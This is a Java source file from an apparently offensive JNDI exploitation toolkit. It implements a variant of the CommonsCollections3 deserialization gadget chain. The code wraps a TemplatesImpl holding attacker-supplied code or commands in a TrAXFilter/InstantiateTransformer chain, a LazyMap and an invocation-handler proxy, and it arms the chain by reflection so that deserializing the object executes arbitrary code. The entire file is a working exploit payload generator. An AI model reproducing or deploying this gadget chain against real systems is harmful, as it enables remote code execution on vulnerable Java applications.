package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.JavaVersion;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import static com.qi4l.jndi.Starter.JYsoMode;
import static com.qi4l.jndi.Starter.cmdLine;


/**
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction","unused"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class CommonsCollections3 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object templatesImpl;
        if (JYsoMode.contains("yso")) {
            templatesImpl = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templatesImpl = Gadgets.createTemplatesImpl(type, param);
        }

        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templatesImpl})};

        final Map               innerMap = new HashMap();
        final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
        final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
        final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return handler;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
